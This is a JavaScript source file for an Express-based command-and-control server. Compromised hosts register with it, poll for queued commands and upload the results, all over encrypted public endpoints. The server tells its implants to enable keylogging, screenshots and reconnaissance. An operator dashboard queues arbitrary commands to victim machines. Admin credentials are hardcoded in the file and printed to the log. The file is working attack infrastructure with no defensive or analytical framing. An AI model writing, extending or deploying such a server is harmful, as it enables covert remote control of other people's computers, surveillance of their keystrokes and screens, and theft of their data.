import express from 'express';
import crypto from 'crypto';
import cors from 'cors';
import compression from 'compression';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import session from 'express-session';
import { WebSocketServer } from 'ws';
import http from 'http';

const PORT = process.env.PORT || 8080;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const ADMIN_USERNAME = 'monitorMutexCPUman';
const ADMIN_PASSWORD = '`f7`8b`c.519e`7ba57f6~s';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

console.log('🚀 Starting Advanced C2 Proxy Server...');
console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

// ==================== MIDDLEWARE ====================
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const limiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: { error: 'Too many requests' }
});
app.use('/api/', limiter);

// ==================== STORAGE ====================
class StoreManager {
    constructor() {
        this.cache = new Map();
        this.dataFile = './data.json';
        this.loadFromDisk();
        setInterval(() => this.saveToDisk(), 60000);
    }

    loadFromDisk() {
        try {
            const fs = require('fs');
            if (fs.existsSync(this.dataFile)) {
                const data = JSON.parse(fs.readFileSync(this.dataFile, 'utf8'));
                for (const [key, value] of Object.entries(data)) {
                    this.cache.set(key, { value, timestamp: Date.now() });
                }
                console.log(`📂 Loaded ${this.cache.size} items from disk`);
            }
        } catch (err) {}
    }

    saveToDisk() {
        try {
            const fs = require('fs');
            const data = {};
            for (const [key, entry] of this.cache) {
                data[key] = entry.value;
            }
            fs.writeFileSync(this.dataFile, JSON.stringify(data, null, 2));
        } catch (err) {}
    }

    async set(key, value) {
        this.cache.set(key, { value, timestamp: Date.now() });
        return true;
    }

    async get(key) {
        const cached = this.cache.get(key);
        return cached ? cached.value : null;
    }

    async delete(key) {
        this.cache.delete(key);
        return true;
    }

    async list(pattern) {
        const keys = Array.from(this.cache.keys());
        if (pattern) {
            const regex = new RegExp(pattern.replace('*', '.*'));
            return keys.filter(k => regex.test(k));
        }
        return keys;
    }
}

const store = new StoreManager();

// ==================== CRYPTO ====================
class CryptoManager {
    constructor(key) {
        this.key = Buffer.from(key, 'utf8');
    }

    encrypt(data) {
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        const authTag = cipher.getAuthTag();
        return { iv: iv.toString('base64'), data: encrypted, authTag: authTag.toString('base64') };
    }

    decrypt(encryptedObj) {
        const iv = Buffer.from(encryptedObj.iv, 'base64');
        const authTag = Buffer.from(encryptedObj.authTag, 'base64');
        const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, iv);
        decipher.setAuthTag(authTag);
        let decrypted = decipher.update(encryptedObj.data, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    }

    generateToken() {
        return crypto.randomBytes(32).toString('hex');
    }
}

const cryptoManager = new CryptoManager(ENCRYPTION_KEY);

// ==================== AUTH ====================
async function authenticate(req, res, next) {
    if (req.session && req.session.isAuthenticated) {
        return next();
    }
    
    const authHeader = req.headers.authorization;
    if (authHeader && authHeader.startsWith('Bearer ')) {
        const token = authHeader.substring(7);
        const validTokens = await store.get('admin_tokens') || [];
        if (validTokens.includes(token)) {
            return next();
        }
    }
    
    res.status(401).json({ error: 'Unauthorized - Please login first' });
}

async function generateAdminToken() {
    const token = cryptoManager.generateToken();
    const tokens = await store.get('admin_tokens') || [];
    tokens.push(token);
    await store.set('admin_tokens', tokens);
    return token;
}

// ==================== CLIENT MANAGER ====================
class ClientManager {
    constructor(store) {
        this.store = store;
        this.clients = new Map();
        this.onlineThreshold = 300000;
    }

    async register(data) {
        const { clientId, hostname, username, ip } = data;
        const clientData = {
            clientId,
            hostname: hostname || 'unknown',
            username: username || 'unknown',
            ip: ip || 'unknown',
            registered: new Date().toISOString(),
            lastSeen: new Date().toISOString(),
            status: 'online'
        };
        await this.store.set(`client:${clientId}`, clientData);
        const clients = await this.store.get('clients') || [];
        if (!clients.includes(clientId)) {
            clients.push(clientId);
            await this.store.set('clients', clients);
        }
        console.log(`✅ Client registered: ${clientId} (${hostname}/${username})`);
        return clientData;
    }

    async heartbeat(clientId) {
        const client = await this.store.get(`client:${clientId}`);
        if (!client) return null;
        client.lastSeen = new Date().toISOString();
        client.status = 'online';
        await this.store.set(`client:${clientId}`, client);
        this.clients.set(clientId, client);
        return client;
    }

    async getPendingCommands(clientId) {
        return await this.store.get(`pending:${clientId}`) || [];
    }

    async getStats() {
        const clients = await this.store.get('clients') || [];
        const stats = { total: clients.length, online: 0, offline: 0 };
        const now = Date.now();
        for (const id of clients) {
            const client = await this.store.get(`client:${id}`);
            if (client) {
                const lastSeen = new Date(client.lastSeen).getTime();
                if (now - lastSeen < this.onlineThreshold) stats.online++;
                else stats.offline++;
            }
        }
        return stats;
    }
}

const clientManager = new ClientManager(store);

// ==================== ANALYTICS ====================
class AnalyticsEngine {
    constructor(store) {
        this.store = store;
    }

    async log(eventType, data) {
        const event = {
            id: Date.now().toString() + '-' + crypto.randomBytes(4).toString('hex'),
            type: eventType,
            data,
            timestamp: new Date().toISOString()
        };
        const key = `event:${event.id}`;
        await this.store.set(key, event);
        const events = await this.store.get('events') || [];
        events.push(key);
        if (events.length > 10000) {
            const old = events.shift();
            await this.store.delete(old);
        }
        await this.store.set('events', events);
        return event;
    }
}

const analytics = new AnalyticsEngine(store);

// ==================== PUBLIC API ENDPOINTS (No Auth Required) ====================

// Health Check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        time: new Date().toISOString(),
        version: '3.0.0',
        clients: clientManager.clients.size,
        uptime: process.uptime(),
        platform: 'Render.com'
    });
});

// Root
app.get('/', (req, res) => {
    res.json({
        name: 'C2 Proxy Server',
        version: '3.0.0',
        status: 'running',
        endpoints: {
            health: '/health',
            dashboard: '/dashboard',
            register: 'POST /api/register (PUBLIC)',
            poll: 'POST /api/poll (PUBLIC)',
            results: 'POST /api/results (PUBLIC)',
            heartbeat: 'POST /api/heartbeat (PUBLIC)',
            admin: '/api/admin/* (Requires Auth)'
        }
    });
});

// ✅ PUBLIC: Register Client
app.post('/api/register', async (req, res) => {
    try {
        const { clientId, hostname, username, ip } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        const clientData = await clientManager.register({ clientId, hostname, username, ip });
        const commands = await clientManager.getPendingCommands(clientId);
        await store.delete(`pending:${clientId}`);
        
        const response = cryptoManager.encrypt({
            status: 'registered',
            clientId,
            commands,
            config: {
                pollingInterval: 2000,
                heartbeatInterval: 300000,
                keyloggerEnabled: true,
                screenshotEnabled: true,
                reconEnabled: true
            }
        });
        
        await analytics.log('client_registered', { clientId, hostname, username, ip });
        res.json(response);
    } catch (err) {
        console.error('Registration error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Poll for Commands
app.post('/api/poll', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        await clientManager.heartbeat(clientId);
        const commands = await clientManager.getPendingCommands(clientId);
        await store.delete(`pending:${clientId}`);
        await analytics.log('poll', { clientId, commandCount: commands.length });
        
        const response = cryptoManager.encrypt({
            status: 'success',
            commands
        });
        
        res.json(response);
    } catch (err) {
        console.error('Poll error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Send Results
app.post('/api/results', async (req, res) => {
    try {
        const { clientId, encryptedData } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        
        let data;
        try {
            data = cryptoManager.decrypt(encryptedData);
        } catch (e) {
            data = req.body;
        }
        
        const { commandId, output, status } = data;
        const resultKey = `result:${clientId}:${commandId || Date.now()}`;
        const resultData = {
            clientId,
            commandId: commandId || Date.now(),
            output,
            status: status || 'completed',
            timestamp: new Date().toISOString()
        };
        
        await store.set(resultKey, resultData);
        const results = await store.get(`results:${clientId}`) || [];
        results.push(resultKey);
        if (results.length > 100) {
            const old = results.shift();
            await store.delete(old);
        }
        await store.set(`results:${clientId}`, results);
        
        await analytics.log('command_result', { clientId, commandId, status });
        const response = cryptoManager.encrypt({
            status: 'success',
            message: 'Results stored'
        });
        res.json(response);
    } catch (err) {
        console.error('Results error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ✅ PUBLIC: Heartbeat
app.post('/api/heartbeat', async (req, res) => {
    try {
        const { clientId } = req.body;
        if (!clientId) {
            return res.status(400).json({ error: 'clientId required' });
        }
        await clientManager.heartbeat(clientId);
        await analytics.log('heartbeat', { clientId });
        res.json({ status: 'success' });
    } catch (err) {
        console.error('Heartbeat error:', err);
        res.status(500).json({ error: err.message });
    }
});

// ==================== ADMIN API (Protected) ====================

app.get('/api/admin/clients', authenticate, async (req, res) => {
    try {
        const clients = await store.get('clients') || [];
        const clientData = [];
        for (const id of clients) {
            const data = await store.get(`client:${id}`);
            if (data) {
                const pending = await store.get(`pending:${id}`) || [];
                const results = await store.get(`results:${id}`) || [];
                data.pendingCommands = pending.length;
                data.resultsCount = results.length;
                clientData.push(data);
            }
        }
        clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
        res.json({ clients: clientData });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/admin/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
            const token = await generateAdminToken();
            res.json({ status: 'success', token, expiresIn: 86400 });
        } else {
            res.status(401).json({ error: 'Invalid credentials' });
        }
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/api/admin/command', authenticate, async (req, res) => {
    try {
        const { clientId, command } = req.body;
        if (!clientId || !command) {
            return res.status(400).json({ error: 'clientId and command required' });
        }
        
        const commandId = Date.now().toString();
        const commandEntry = {
            id: commandId,
            command,
            timestamp: new Date().toISOString(),
            status: 'pending'
        };
        
        const pendingCommands = await store.get(`pending:${clientId}`) || [];
        pendingCommands.push(commandEntry);
        await store.set(`pending:${clientId}`, pendingCommands);
        
        await analytics.log('command_sent', { clientId, commandId, command });
        res.json({ status: 'success', commandId });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.get('/api/admin/results/:clientId', authenticate, async (req, res) => {
    try {
        const { clientId } = req.params;
        const resultKeys = await store.get(`results:${clientId}`) || [];
        const results = [];
        for (const key of resultKeys.slice(-20)) {
            const data = await store.get(key);
            if (data) results.push(data);
        }
        res.json({ results: results.reverse() });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ==================== DASHBOARD ====================
app.get('/dashboard', (req, res) => {
    // ... dashboard HTML
    res.send(`
<!DOCTYPE html>
<html>
<head><title>C2 Dashboard</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family: 'Segoe UI', sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }
    .container { max-width: 1200px; margin: 0 auto; }
    h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
    .card { background: #141d2b; border-radius: 10px; padding: 20px; margin: 20px 0; border: 1px solid #1e2d3d; }
    .card h2 { color: #00ff88; }
    .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 15px; }
    .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; }
    .client-card .id { color: #00ff88; font-weight: bold; }
    .client-card .detail { color: #8899aa; font-size: 0.9em; }
    .status { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.8em; }
    .status.online { background: #00ff8822; color: #00ff88; }
    .status.offline { background: #ff444422; color: #ff4444; }
    button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    button:hover { background: #00cc66; }
    .flex { display: flex; gap: 10px; }
    .flex > * { flex: 1; }
    input { background: #0a0e17; color: #e0e0e0; border: 1px solid #1e2d3d; padding: 10px; border-radius: 5px; width: 100%; }
    .logout-btn { background: #ff4444; color: white; }
    .logout-btn:hover { background: #cc0000; }
</style>
</head>
<body>
<div class="container">
    <div style="display: flex; justify-content: space-between; align-items: center;">
        <h1>🎯 C2 Proxy Dashboard</h1>
        <button class="logout-btn" onclick="logout()">🚪 Logout</button>
    </div>
    
    <div class="card">
        <h2>📡 Server Status</h2>
        <p id="status">Loading...</p>
        <button onclick="refresh()">🔄 Refresh</button>
    </div>
    
    <div class="card">
        <h2>🖥️ Connected Clients</h2>
        <div id="clients" class="client-grid">Loading...</div>
    </div>
    
    <div class="card">
        <h2>📤 Send Command</h2>
        <div class="flex">
            <input type="text" id="clientId" placeholder="Client ID">
            <input type="text" id="command" placeholder="Command">
            <button onclick="sendCommand()">▶ Execute</button>
        </div>
        <div id="result"></div>
    </div>
</div>

<script>
    let token = localStorage.getItem('token');
    
    function refresh() {
        fetch('/api/admin/clients', {
            headers: { 'Authorization': 'Bearer ' + token }
        })
        .then(res => res.json())
        .then(data => {
            if (data.error) {
                document.getElementById('status').innerHTML = '❌ ' + data.error;
                return;
            }
            document.getElementById('status').innerHTML = '✅ Online - ' + data.clients.length + ' clients';
            const grid = document.getElementById('clients');
            grid.innerHTML = '';
            data.clients.forEach(c => {
                const card = document.createElement('div');
                card.className = 'client-card';
                const now = Date.now();
                const lastSeen = new Date(c.lastSeen).getTime();
                const isOnline = (now - lastSeen) < 300000;
                card.innerHTML = \`
                    <div class="id">\${c.clientId}</div>
                    <div class="detail">Host: \${c.hostname}</div>
                    <div class="detail">User: \${c.username}</div>
                    <div class="detail">IP: \${c.ip}</div>
                    <span class="status \${isOnline ? 'online' : 'offline'}">\${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
                \`;
                grid.appendChild(card);
            });
        })
        .catch(err => {
            document.getElementById('status').innerHTML = '❌ Error: ' + err.message;
        });
    }
    
    function sendCommand() {
        const clientId = document.getElementById('clientId').value;
        const command = document.getElementById('command').value;
        if (!clientId || !command) {
            alert('Enter both Client ID and Command');
            return;
        }
        
        fetch('/api/admin/command', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + token
            },
            body: JSON.stringify({ clientId, command })
        })
        .then(res => res.json())
        .then(data => {
            document.getElementById('result').innerHTML = data.error ? '❌ ' + data.error : '✅ Command sent!';
            if (!data.error) refresh();
        })
        .catch(err => {
            document.getElementById('result').innerHTML = '❌ Error: ' + err.message;
        });
    }
    
    function logout() {
        localStorage.removeItem('token');
        window.location.href = '/login';
    }
    
    // Check if logged in
    if (!token) {
        const p = prompt('Enter admin password:', '');
        if (p) {
            fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: 'admin', password: p })
            })
            .then(res => res.json())
            .then(data => {
                if (data.token) {
                    token = data.token;
                    localStorage.setItem('token', token);
                    refresh();
                } else {
                    alert('Login failed: ' + data.error);
                }
            })
            .catch(err => alert('Error: ' + err.message));
        }
    } else {
        refresh();
    }
    
    setInterval(refresh, 30000);
</script>
</body>
</html>
    `);
});

// ==================== WEBSOCKET ====================
wss.on('connection', (ws) => {
    console.log('🔌 WebSocket connected');
    ws.on('close', () => console.log('🔌 WebSocket disconnected'));
});

// ==================== START ====================
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 C2 Proxy Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
});

process.on('uncaughtException', (err) => console.error('❌ Error:', err.message));
